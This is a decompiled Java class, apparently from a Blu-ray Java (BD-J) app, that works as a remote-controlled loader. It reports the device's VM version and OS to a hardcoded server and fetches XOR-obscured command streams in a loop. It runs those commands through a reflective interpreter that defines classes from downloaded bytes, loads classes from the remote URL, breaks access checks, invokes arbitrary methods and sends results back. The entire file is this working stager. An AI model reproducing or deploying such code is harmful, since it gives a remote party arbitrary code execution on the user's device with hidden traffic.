/*
 * Decompiled with CFR 0.152.
 */
package org.bdj;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Vector;
import org.bdj.Screen;

public class Boot {
    static String EP = "";
    static String SID = "";
    static byte[] SK = null;
    static long[] R = new long[128];
    static Object[] O = new Object[64];
    static Object[] M = new Object[64];
    static String[] S = new String[64];
    static byte[][] Z = new byte[32][];
    static ClassLoader PAR = Boot.class.getClassLoader();
    static String note = null;
    static boolean said = false;
    static long burn = 0L;
    static int step = 0;
    static int seq = 0;
    static byte[] CKB = null;
    static byte[] KSB = new byte[]{36, 63, 106, -120, -123, -93, 8, -45, 88, 81, -12, 45, 76, -107, 127, 45, 20, 5, 123, 126, -9, 103, -127, 79, 0, 0, 0, 0, 0, 0, 0, 33};

    static long ksq(int n) {
        byte[] byArray = KSB;
        int n2 = n * 8;
        long l = 0L;
        for (int i = 0; i < 8; ++i) {
            l = l << 8 | (long)byArray[n2 + i] & 0xFFL;
        }
        return l;
    }

    static byte[] xor(byte[] byArray, int n, byte[] byArray2) {
        int n2;
        if (SK == null) {
            return byArray;
        }
        long l = Boot.ksq(0);
        long l2 = Boot.ksq(1);
        long l3 = Boot.ksq(2);
        int n3 = (int)(Boot.ksq(3) & 0x3FL);
        for (n2 = 0; n2 < SK.length; ++n2) {
            l = l * l2 + (long)(SK[n2] & 0xFF) + l3;
        }
        for (n2 = 0; n2 < byArray2.length; ++n2) {
            l = l * l2 + (long)(byArray2[n2] & 0xFF) + l3;
        }
        for (n2 = n; n2 < byArray.length; ++n2) {
            l = l * l2 + l3;
            byArray[n2] = (byte)(byArray[n2] ^ (int)(l >>> n3 & 0xFFL));
        }
        return byArray;
    }

    static byte[] hexb(String string) {
        int n = string.length() / 2;
        byte[] byArray = new byte[n];
        for (int i = 0; i < n; ++i) {
            byArray[i] = (byte)Integer.parseInt(string.substring(i * 2, i * 2 + 2), 16);
        }
        return byArray;
    }

    static long mix(byte[] byArray, byte[] byArray2) {
        int n;
        long l = Boot.ksq(0);
        long l2 = Boot.ksq(1);
        long l3 = Boot.ksq(2);
        for (n = 0; n < byArray.length; ++n) {
            l = l * l2 + (long)(byArray[n] & 0xFF) + l3;
        }
        for (n = 0; n < byArray2.length; ++n) {
            l = l * l2 + (long)(byArray2[n] & 0xFF) + l3;
        }
        for (n = 0; n < 8; ++n) {
            l = l * l2 + l3;
        }
        return l;
    }

    static String hex16(long l) {
        char[] cArray = new char[16];
        String string = "0123456789abcdef";
        for (int i = 15; i >= 0; --i) {
            cArray[i] = string.charAt((int)(l & 0xFL));
            l >>>= 4;
        }
        return new String(cArray);
    }

    static String ticket(byte[] byArray, int n, int n2) {
        byte[] byArray2;
        byte[] byArray3;
        if (SK == null) {
            byArray3 = CKB;
        } else {
            byArray3 = new byte[CKB.length + SK.length];
            System.arraycopy(CKB, 0, byArray3, 0, CKB.length);
            System.arraycopy(SK, 0, byArray3, CKB.length, SK.length);
        }
        try {
            byArray2 = SID.getBytes("UTF-8");
        }
        catch (Throwable throwable) {
            byArray2 = new byte[]{};
        }
        byte[] byArray4 = new byte[12 + byArray2.length + 4];
        System.arraycopy(byArray, 0, byArray4, 0, 8);
        byArray4[8] = (byte)(n >>> 24);
        byArray4[9] = (byte)(n >>> 16);
        byArray4[10] = (byte)(n >>> 8);
        byArray4[11] = (byte)n;
        System.arraycopy(byArray2, 0, byArray4, 12, byArray2.length);
        int n3 = 12 + byArray2.length;
        byArray4[n3] = (byte)(n2 >>> 24);
        byArray4[n3 + 1] = (byte)(n2 >>> 16);
        byArray4[n3 + 2] = (byte)(n2 >>> 8);
        byArray4[n3 + 3] = (byte)n2;
        return "c6." + n + "." + Boot.hex16(Boot.mix(byArray3, byArray4));
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Loose catch block
     */
    static byte[] io(String string, byte[] byArray) {
        byte[] byArray2;
        HttpURLConnection httpURLConnection;
        block25: {
            int n;
            block24: {
                httpURLConnection = null;
                httpURLConnection = (HttpURLConnection)new URL(EP + string).openConnection();
                byte[] byArray3 = new byte[8];
                long l = System.identityHashCode(httpURLConnection);
                l = l * 6364136223846793005L + (long)(Math.random() * 4.294967296E9);
                for (int i = 0; i < 8; ++i) {
                    byArray3[i] = (byte)(l >>> i * 8);
                }
                if (byArray == null) {
                    byArray = new byte[]{};
                }
                byte[] byArray4 = new byte[8 + byArray.length];
                System.arraycopy(byArray3, 0, byArray4, 0, 8);
                System.arraycopy(byArray, 0, byArray4, 8, byArray.length);
                Boot.xor(byArray4, 8, byArray3);
                int n2 = seq++;
                httpURLConnection.setRequestMethod("POST");
                httpURLConnection.setRequestProperty("X-Ticket", Boot.ticket(byArray3, n2, byArray4.length));
                httpURLConnection.setDoOutput(true);
                OutputStream outputStream = httpURLConnection.getOutputStream();
                outputStream.write(byArray4);
                outputStream.flush();
                outputStream.close();
                if (httpURLConnection.getResponseCode() == 200) break block24;
                byte[] byArray5 = null;
                try {
                    if (httpURLConnection != null) {
                        httpURLConnection.disconnect();
                    }
                }
                catch (Throwable throwable) {
                    // empty catch block
                }
                return byArray5;
            }
            InputStream inputStream = httpURLConnection.getInputStream();
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] byArray6 = new byte[8192];
            while ((n = inputStream.read(byArray6)) >= 0) {
                byteArrayOutputStream.write(byArray6, 0, n);
            }
            inputStream.close();
            byArray2 = byteArrayOutputStream.toByteArray();
            if (byArray2.length >= 8) break block25;
            byte[] byArray7 = null;
            try {
                if (httpURLConnection != null) {
                    httpURLConnection.disconnect();
                }
            }
            catch (Throwable throwable) {
                // empty catch block
            }
            return byArray7;
        }
        byte[] byArray8 = new byte[8];
        System.arraycopy(byArray2, 0, byArray8, 0, 8);
        Boot.xor(byArray2, 8, byArray8);
        byte[] byArray9 = new byte[byArray2.length - 8];
        System.arraycopy(byArray2, 8, byArray9, 0, byArray9.length);
        byte[] byArray10 = byArray9;
        try {
            if (httpURLConnection != null) {
                httpURLConnection.disconnect();
            }
        }
        catch (Throwable throwable) {
            // empty catch block
        }
        return byArray10;
        catch (Throwable throwable) {
            try {
                byte[] byArray11 = null;
                return byArray11;
            }
            catch (Throwable throwable2) {
                throw throwable2;
            }
            finally {
                try {
                    if (httpURLConnection != null) {
                        httpURLConnection.disconnect();
                    }
                }
                catch (Throwable throwable3) {}
            }
        }
    }

    static Object arg(DataInputStream dataInputStream) throws Exception {
        int n = dataInputStream.readUnsignedByte();
        long l = dataInputStream.readLong();
        switch (n) {
            case 0: {
                return new Long(l);
            }
            case 1: {
                return new Integer((int)l);
            }
            case 2: {
                return O[(int)l];
            }
            case 3: {
                return S[(int)l];
            }
            case 4: {
                return null;
            }
            case 5: {
                return l != 0L ? Boolean.TRUE : Boolean.FALSE;
            }
            case 6: {
                return new Long(R[(int)l]);
            }
            case 7: {
                return new Integer((int)R[(int)l]);
            }
            case 8: {
                return new Byte((byte)l);
            }
            case 9: {
                return new Short((short)l);
            }
            case 10: {
                return Z[(int)l];
            }
            case 11: {
                return new Character((char)l);
            }
            case 12: {
                return new Float(l);
            }
            case 13: {
                return new Double(Double.longBitsToDouble(l));
            }
        }
        return null;
    }

    static long num(Object object) {
        if (object == null) {
            return 0L;
        }
        if (object instanceof Number) {
            return ((Number)object).longValue();
        }
        if (object instanceof Boolean) {
            return (Boolean)object != false ? 1L : 0L;
        }
        if (object instanceof Character) {
            return ((Character)object).charValue();
        }
        return 1L;
    }

    static Class cls(long l) throws Exception {
        int n = (int)l;
        if (n >= 0) {
            return (Class)O[n];
        }
        switch (n) {
            case -1: {
                return Long.TYPE;
            }
            case -2: {
                return Integer.TYPE;
            }
            case -3: {
                return Boolean.TYPE;
            }
            case -4: {
                return Byte.TYPE;
            }
            case -5: {
                return Short.TYPE;
            }
            case -6: {
                return Character.TYPE;
            }
            case -7: {
                return Float.TYPE;
            }
            case -8: {
                return Double.TYPE;
            }
            case -9: {
                return Void.TYPE;
            }
            case -10: {
                return Object.class;
            }
            case -11: {
                return String.class;
            }
            case -12: {
                return Class.class;
            }
        }
        return Object.class;
    }

    static void put(int n, int n2, Object object) {
        if (n == 0) {
            Boot.R[n2] = Boot.num(object);
        } else if (n == 1) {
            Boot.O[n2] = object;
        } else if (n == 2) {
            Boot.Z[n2] = (byte[])object;
        } else if (n == 3) {
            Boot.S[n2] = object == null ? null : object.toString();
        }
    }

    static byte[] exec(byte[] byArray) {
        Object object;
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        DataOutputStream dataOutputStream = new DataOutputStream(byteArrayOutputStream);
        Vector<byte[]> vector = new Vector<byte[]>();
        int n = -1;
        long l = 0L;
        note = null;
        try {
            object = new DataInputStream(new ByteArrayInputStream(byArray));
            int n2 = ((DataInputStream)object).readUnsignedShort();
            block58: for (n = 0; n < n2; ++n) {
                int n3 = ((DataInputStream)object).readUnsignedByte();
                switch (n3) {
                    case 1: {
                        l = ((DataInputStream)object).readLong();
                        n = n2;
                        continue block58;
                    }
                    case 2: {
                        long l2 = ((DataInputStream)object).readLong();
                        Screen.println(Long.toHexString(l2));
                        continue block58;
                    }
                    case 3: {
                        long l3 = ((DataInputStream)object).readLong();
                        long l4 = ((DataInputStream)object).readLong();
                        try {
                            Thread.sleep(l3);
                        }
                        catch (Throwable throwable) {}
                        continue block58;
                    }
                    case 4: {
                        long l5 = ((DataInputStream)object).readLong();
                        for (long i = 0L; i < l5; ++i) {
                            burn = burn * 6364136223846793005L + i;
                        }
                        continue block58;
                    }
                    case 5: {
                        int n4 = (int)((DataInputStream)object).readLong();
                        int n5 = ((DataInputStream)object).readInt();
                        byte[] byArray2 = new byte[n5];
                        ((DataInputStream)object).readFully(byArray2);
                        Boot.S[n4] = new String(byArray2, "UTF-8");
                        continue block58;
                    }
                    case 6: {
                        int n6 = (int)((DataInputStream)object).readLong();
                        int n7 = ((DataInputStream)object).readInt();
                        byte[] byArray3 = new byte[n7];
                        ((DataInputStream)object).readFully(byArray3);
                        Boot.Z[n6] = byArray3;
                        continue block58;
                    }
                    case 7: {
                        int n8 = (int)((DataInputStream)object).readLong();
                        int n9 = (int)((DataInputStream)object).readLong();
                        Boot.O[n8] = Class.forName(S[n9], true, PAR);
                        continue block58;
                    }
                    case 8: {
                        Constructor<?>[] constructorArray;
                        int n10 = (int)((DataInputStream)object).readLong();
                        int n11 = (int)((DataInputStream)object).readLong();
                        int n12 = (int)((DataInputStream)object).readLong();
                        int n13 = (int)((DataInputStream)object).readLong();
                        Throwable throwable = null;
                        try {
                            Boot.O[n10] = new L(Z[n11], S[n12]).loadClass(S[n12], true);
                        }
                        catch (Throwable throwable2) {
                            throwable = throwable2;
                            if (n13 == 0) {
                                throw throwable2;
                            }
                            Class<?> clazz = Class.forName("org.dvb.lang.DVBClassLoader");
                            constructorArray = Class.forName("[Ljava.net.URL;");
                            Class<?> clazz2 = Class.forName("java.lang.ClassLoader");
                            Method method = clazz.getMethod("newInstance", new Class[]{constructorArray, clazz2});
                            Object object2 = Array.newInstance(Class.forName("java.net.URL"), 1);
                            Array.set(object2, 0, new URL(EP + "/x/" + SID + "/"));
                            Object object3 = method.invoke(null, object2, PAR);
                            Method method2 = clazz2.getMethod("loadClass", Class.forName("java.lang.String"));
                            Boot.O[n10] = (Class)method2.invoke(object3, S[n12]);
                        }
                        if (throwable != null && !said) {
                            said = true;
                            note = "d1:" + throwable.getClass().getName() + ":" + throwable.getMessage();
                        }
                        Boot.Z[n11] = null;
                        continue block58;
                    }
                    case 9: {
                        int n14;
                        Constructor<?>[] constructorArray;
                        int n15 = (int)((DataInputStream)object).readLong();
                        Class clazz = Boot.cls(((DataInputStream)object).readLong());
                        int n16 = ((DataInputStream)object).readUnsignedByte();
                        Class[] classArray = new Class[n16];
                        for (n14 = 0; n14 < n16; ++n14) {
                            classArray[n14] = Boot.cls(((DataInputStream)object).readLong());
                        }
                        n14 = ((DataInputStream)object).readUnsignedByte();
                        Object object4 = new Object[n14];
                        for (int i = 0; i < n14; ++i) {
                            object4[i] = Boot.arg((DataInputStream)object);
                        }
                        if (n14 == 0 && n16 == 0) {
                            Boot.O[n15] = clazz.newInstance();
                            continue block58;
                        }
                        Constructor<Object> constructor = null;
                        if (n16 > 0) {
                            try {
                                constructor = clazz.getDeclaredConstructor(classArray);
                            }
                            catch (Throwable throwable) {
                                constructor = clazz.getConstructor(classArray);
                            }
                        } else {
                            constructorArray = null;
                            try {
                                constructorArray = clazz.getDeclaredConstructors();
                            }
                            catch (Throwable throwable) {
                                constructorArray = clazz.getConstructors();
                            }
                            for (int i = 0; i < constructorArray.length; ++i) {
                                if (constructorArray[i].getParameterTypes().length != n14) continue;
                                constructor = constructorArray[i];
                                break;
                            }
                        }
                        try {
                            constructor.setAccessible(true);
                        }
                        catch (Throwable throwable) {
                            // empty catch block
                        }
                        Boot.O[n15] = constructor.newInstance((Object[])object4);
                        continue block58;
                    }
                    case 10: {
                        int n17 = (int)((DataInputStream)object).readLong();
                        Class clazz = Boot.cls(((DataInputStream)object).readLong());
                        int n18 = (int)((DataInputStream)object).readLong();
                        int n19 = ((DataInputStream)object).readUnsignedByte();
                        Class[] classArray = new Class[n19];
                        for (int i = 0; i < n19; ++i) {
                            classArray[i] = Boot.cls(((DataInputStream)object).readLong());
                        }
                        Object object4 = null;
                        try {
                            object4 = clazz.getDeclaredMethod(S[n18], classArray);
                        }
                        catch (Throwable throwable) {
                            object4 = clazz.getMethod(S[n18], classArray);
                        }
                        try {
                            ((Method)object4).setAccessible(true);
                        }
                        catch (Throwable throwable) {
                            // empty catch block
                        }
                        Boot.M[n17] = object4;
                        continue block58;
                    }
                    case 11: {
                        int n20 = (int)((DataInputStream)object).readLong();
                        Class clazz = Boot.cls(((DataInputStream)object).readLong());
                        int n21 = (int)((DataInputStream)object).readLong();
                        Field field = null;
                        try {
                            field = clazz.getDeclaredField(S[n21]);
                        }
                        catch (Throwable throwable) {
                            field = clazz.getField(S[n21]);
                        }
                        try {
                            field.setAccessible(true);
                        }
                        catch (Throwable throwable) {
                            // empty catch block
                        }
                        Boot.M[n20] = field;
                        continue block58;
                    }
                    case 12: {
                        int n22 = (int)((DataInputStream)object).readLong();
                        int n23 = (int)((DataInputStream)object).readLong();
                        int n24 = (int)((DataInputStream)object).readLong();
                        Object object5 = Boot.arg((DataInputStream)object);
                        Boot.put(n22, n23, ((Field)M[n24]).get(object5));
                        continue block58;
                    }
                    case 13: {
                        int n25 = (int)((DataInputStream)object).readLong();
                        Object object6 = Boot.arg((DataInputStream)object);
                        Object object7 = Boot.arg((DataInputStream)object);
                        ((Field)M[n25]).set(object6, object7);
                        continue block58;
                    }
                    case 14: {
                        int n26 = (int)((DataInputStream)object).readLong();
                        int n27 = (int)((DataInputStream)object).readLong();
                        int n28 = (int)((DataInputStream)object).readLong();
                        Object object8 = Boot.arg((DataInputStream)object);
                        int n29 = ((DataInputStream)object).readUnsignedByte();
                        Object object4 = new Object[n29];
                        for (int i = 0; i < n29; ++i) {
                            object4[i] = Boot.arg((DataInputStream)object);
                        }
                        Boot.put(n26, n27, ((Method)M[n28]).invoke(object8, (Object[])object4));
                        continue block58;
                    }
                    case 15: {
                        int n30 = (int)((DataInputStream)object).readLong();
                        Class clazz = Boot.cls(((DataInputStream)object).readLong());
                        int n31 = (int)((DataInputStream)object).readLong();
                        Boot.O[n30] = Array.newInstance(clazz, n31);
                        continue block58;
                    }
                    case 16: {
                        int n32 = (int)((DataInputStream)object).readLong();
                        int n33 = (int)((DataInputStream)object).readLong();
                        int n34 = (int)((DataInputStream)object).readLong();
                        int n35 = (int)((DataInputStream)object).readLong();
                        Boot.put(n32, n33, Array.get(O[n34], n35));
                        continue block58;
                    }
                    case 17: {
                        int n36 = (int)((DataInputStream)object).readLong();
                        int n37 = (int)((DataInputStream)object).readLong();
                        Array.set(O[n36], n37, Boot.arg((DataInputStream)object));
                        continue block58;
                    }
                    case 18: {
                        int n38 = (int)((DataInputStream)object).readLong();
                        int n39 = (int)((DataInputStream)object).readLong();
                        Boot.R[n38] = Array.getLength(O[n39]);
                        continue block58;
                    }
                    case 19: {
                        int n40 = (int)((DataInputStream)object).readLong();
                        Boot.R[n40] = Boot.num(Boot.arg((DataInputStream)object));
                        continue block58;
                    }
                    case 20: {
                        int n41 = (int)((DataInputStream)object).readLong();
                        int n42 = (int)((DataInputStream)object).readLong();
                        long l6 = Boot.num(Boot.arg((DataInputStream)object));
                        long l7 = Boot.num(Boot.arg((DataInputStream)object));
                        long l8 = 0L;
                        if (n42 == 0) {
                            l8 = l6 + l7;
                        } else if (n42 == 1) {
                            l8 = l6 - l7;
                        } else if (n42 == 2) {
                            l8 = l6 & l7;
                        } else if (n42 == 3) {
                            l8 = l6 | l7;
                        } else if (n42 == 4) {
                            l8 = l6 ^ l7;
                        } else if (n42 == 5) {
                            l8 = l6 << (int)l7;
                        } else if (n42 == 6) {
                            l8 = l6 >>> (int)l7;
                        } else if (n42 == 7) {
                            l8 = l6 * l7;
                        } else if (n42 == 8) {
                            l8 = l7 == 0L ? 0L : l6 / l7;
                        } else if (n42 == 9) {
                            l8 = l6 == l7 ? 1L : 0L;
                        } else if (n42 == 10) {
                            l8 = l6 < l7 ? 1L : 0L;
                        } else if (n42 == 11) {
                            l8 = l6 > l7 ? 1L : 0L;
                        }
                        Boot.R[n41] = l8;
                        continue block58;
                    }
                    case 21: {
                        dataOutputStream.writeLong(Boot.num(Boot.arg((DataInputStream)object)));
                        continue block58;
                    }
                    case 22: {
                        Object object4;
                        int n43 = (int)((DataInputStream)object).readLong();
                        int n44 = (int)((DataInputStream)object).readLong();
                        Object object9 = O[n43];
                        ByteArrayOutputStream byteArrayOutputStream2 = new ByteArrayOutputStream();
                        DataOutputStream dataOutputStream2 = new DataOutputStream(byteArrayOutputStream2);
                        if (object9 != null) {
                            if (n44 == 0) {
                                object4 = (byte[])object9;
                                dataOutputStream2.write((byte[])object4, 0, ((Object[])object4).length);
                            } else if (n44 == 1) {
                                object4 = (int[])object9;
                                for (int i = 0; i < ((Object[])object4).length; ++i) {
                                    dataOutputStream2.writeInt((int)object4[i]);
                                }
                            } else if (n44 == 2) {
                                object4 = (long[])object9;
                                for (int i = 0; i < ((Object)object4).length; ++i) {
                                    dataOutputStream2.writeLong((long)object4[i]);
                                }
                            }
                        }
                        dataOutputStream2.flush();
                        vector.addElement(byteArrayOutputStream2.toByteArray());
                        continue block58;
                    }
                    case 23: {
                        int n45 = (int)((DataInputStream)object).readLong();
                        vector.addElement(Z[n45] == null ? new byte[]{} : Z[n45]);
                        continue block58;
                    }
                    case 24: {
                        int n46 = (int)((DataInputStream)object).readLong();
                        int n47 = (int)((DataInputStream)object).readLong();
                        if (R[n46] != 0L) continue block58;
                        for (int i = 0; i < n47 && n < n2; ++n, ++i) {
                            Boot.skip((DataInputStream)object);
                        }
                        continue block58;
                    }
                    case 25: {
                        System.gc();
                        System.gc();
                        continue block58;
                    }
                    case 26: {
                        int n48 = (int)((DataInputStream)object).readLong();
                        int n49 = (int)((DataInputStream)object).readLong();
                        Boot.O[n48] = O[n49];
                        continue block58;
                    }
                    case 27: {
                        int n50 = (int)((DataInputStream)object).readLong();
                        Boot.O[n50] = Boot.arg((DataInputStream)object);
                        continue block58;
                    }
                    case 28: {
                        int n51 = (int)((DataInputStream)object).readLong();
                        int n52 = (int)((DataInputStream)object).readLong();
                        Boot.O[n51] = new Object[]{O[n52]};
                        continue block58;
                    }
                    case 30: {
                        int n53 = (int)((DataInputStream)object).readLong();
                        int n54 = (int)((DataInputStream)object).readLong();
                        Boot.O[n53] = M[n54];
                        continue block58;
                    }
                    case 29: {
                        int n55 = (int)((DataInputStream)object).readLong();
                        final Object object10 = Boot.arg((DataInputStream)object);
                        int n56 = ((DataInputStream)object).readUnsignedByte();
                        final Object[] objectArray = new Object[n56];
                        for (int i = 0; i < n56; ++i) {
                            objectArray[i] = Boot.arg((DataInputStream)object);
                        }
                        final Method method = (Method)M[n55];
                        new Thread(new Runnable(){

                            public void run() {
                                try {
                                    method.invoke(object10, objectArray);
                                }
                                catch (Throwable throwable) {
                                    // empty catch block
                                }
                            }
                        }).start();
                        continue block58;
                    }
                    default: {
                        l = -2989L;
                        n = n2;
                    }
                }
            }
        }
        catch (Throwable throwable) {
            l = -1L;
            String string = null;
            try {
                string = throwable.getClass().getName() + ": " + throwable.getMessage();
            }
            catch (Throwable throwable3) {
                // empty catch block
            }
            note = note == null ? string : note + " | " + string;
        }
        try {
            if (note != null) {
                try {
                    vector.addElement(note.getBytes("UTF-8"));
                }
                catch (Throwable throwable) {
                    // empty catch block
                }
            }
            dataOutputStream.flush();
            object = byteArrayOutputStream.toByteArray();
            ByteArrayOutputStream byteArrayOutputStream3 = new ByteArrayOutputStream();
            DataOutputStream dataOutputStream3 = new DataOutputStream(byteArrayOutputStream3);
            dataOutputStream3.writeLong(l);
            dataOutputStream3.writeInt(n);
            dataOutputStream3.writeInt(((Object)object).length / 8);
            dataOutputStream3.write((byte[])object);
            dataOutputStream3.writeInt(vector.size());
            for (int i = 0; i < vector.size(); ++i) {
                byte[] byArray4 = (byte[])vector.elementAt(i);
                dataOutputStream3.writeInt(byArray4.length);
                dataOutputStream3.write(byArray4);
            }
            dataOutputStream3.flush();
            return byteArrayOutputStream3.toByteArray();
        }
        catch (Throwable throwable) {
            return new byte[0];
        }
    }

    static void skip(DataInputStream dataInputStream) throws Exception {
        int n;
        int n2 = dataInputStream.readUnsignedByte();
        int n3 = 0;
        switch (n2) {
            case 1: {
                n = 1;
                break;
            }
            case 2: {
                n = 1;
                break;
            }
            case 3: {
                n = 2;
                break;
            }
            case 4: {
                n = 1;
                break;
            }
            case 5: 
            case 6: {
                dataInputStream.readLong();
                int n4 = dataInputStream.readInt();
                dataInputStream.skipBytes(n4);
                return;
            }
            case 7: {
                n = 2;
                break;
            }
            case 8: {
                n = 4;
                break;
            }
            case 9: {
                dataInputStream.readLong();
                dataInputStream.readLong();
                int n5 = dataInputStream.readUnsignedByte();
                dataInputStream.skipBytes(n5 * 8);
                int n6 = dataInputStream.readUnsignedByte();
                dataInputStream.skipBytes(n6 * 9);
                return;
            }
            case 10: {
                dataInputStream.readLong();
                dataInputStream.readLong();
                dataInputStream.readLong();
                int n7 = dataInputStream.readUnsignedByte();
                dataInputStream.skipBytes(n7 * 8);
                return;
            }
            case 11: {
                n = 3;
                break;
            }
            case 12: {
                dataInputStream.readLong();
                dataInputStream.readLong();
                dataInputStream.readLong();
                dataInputStream.skipBytes(9);
                return;
            }
            case 13: {
                dataInputStream.readLong();
                dataInputStream.skipBytes(18);
                return;
            }
            case 14: {
                dataInputStream.readLong();
                dataInputStream.readLong();
                dataInputStream.readLong();
                dataInputStream.skipBytes(9);
                int n8 = dataInputStream.readUnsignedByte();
                dataInputStream.skipBytes(n8 * 9);
                return;
            }
            case 15: {
                n = 3;
                break;
            }
            case 16: {
                n = 4;
                break;
            }
            case 17: {
                dataInputStream.readLong();
                dataInputStream.readLong();
                dataInputStream.skipBytes(9);
                return;
            }
            case 18: {
                n = 2;
                break;
            }
            case 19: {
                dataInputStream.readLong();
                dataInputStream.skipBytes(9);
                return;
            }
            case 20: {
                dataInputStream.readLong();
                dataInputStream.readLong();
                dataInputStream.skipBytes(18);
                return;
            }
            case 21: {
                dataInputStream.skipBytes(9);
                return;
            }
            case 22: {
                n = 2;
                break;
            }
            case 23: {
                n = 1;
                break;
            }
            case 24: {
                n = 2;
                break;
            }
            case 25: {
                n = 0;
                break;
            }
            case 26: {
                n = 2;
                break;
            }
            case 27: {
                dataInputStream.readLong();
                dataInputStream.skipBytes(9);
                return;
            }
            case 28: {
                n = 2;
                break;
            }
            case 29: {
                dataInputStream.readLong();
                dataInputStream.skipBytes(9);
                int n9 = dataInputStream.readUnsignedByte();
                dataInputStream.skipBytes(n9 * 9);
                return;
            }
            case 30: {
                n = 2;
                break;
            }
            default: {
                n = 0;
            }
        }
        dataInputStream.skipBytes(n * 8 + n3);
    }

    public static String run() {
        EP = "http://tester.f5rvoice.com:1992";
        try {
            CKB = Boot.hexb("942a76d6946a34ce476bdabb09989f4c");
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            DataOutputStream dataOutputStream = new DataOutputStream(byteArrayOutputStream);
            dataOutputStream.writeInt(1);
            byte[] byArray = "6".getBytes("UTF-8");
            dataOutputStream.writeInt(byArray.length);
            dataOutputStream.write(byArray);
            String string = "";
            try {
                string = System.getProperty("java.vm.version", "") + "|" + System.getProperty("os.name", "");
            }
            catch (Throwable throwable) {
                // empty catch block
            }
            byte[] byArray2 = string.getBytes("UTF-8");
            dataOutputStream.writeInt(byArray2.length);
            dataOutputStream.write(byArray2);
            dataOutputStream.flush();
            byte[] byArray3 = Boot.io("/s", byteArrayOutputStream.toByteArray());
            if (byArray3 == null || byArray3.length < 20) {
                Screen.println("-");
                return "-";
            }
            DataInputStream dataInputStream = new DataInputStream(new ByteArrayInputStream(byArray3));
            int n = dataInputStream.readInt();
            if (n <= 0 || n > 64) {
                Screen.println("-");
                return "-";
            }
            SK = new byte[n];
            dataInputStream.readFully(SK);
            int n2 = dataInputStream.readInt();
            byte[] byArray4 = new byte[n2];
            dataInputStream.readFully(byArray4);
            SID = new String(byArray4, "UTF-8");
            byte[] byArray5 = new byte[]{};
            for (int i = 0; i < 100000; ++i) {
                byte[] byArray6 = Boot.io("/n?s=" + SID, byArray5);
                if (byArray6 == null) {
                    Screen.println(".");
                    return ".";
                }
                if (byArray6.length < 2) break;
                byArray5 = Boot.exec(byArray6);
                ++step;
            }
            Screen.println("+");
            return "+";
        }
        catch (Throwable throwable) {
            Screen.println("!");
            return "!";
        }
    }

    static class L
    extends ClassLoader {
        private final byte[] c;
        private final String n;

        L(byte[] byArray, String string) {
            super(PAR);
            this.c = byArray;
            this.n = string;
        }

        protected Class loadClass(String string, boolean bl) throws ClassNotFoundException {
            if (string.equals(this.n)) {
                Class<?> clazz = this.findLoadedClass(string);
                if (clazz == null) {
                    clazz = this.defineClass(string, this.c, 0, this.c.length);
                }
                if (bl) {
                    this.resolveClass(clazz);
                }
                return clazz;
            }
            return super.loadClass(string, bl);
        }
    }
}

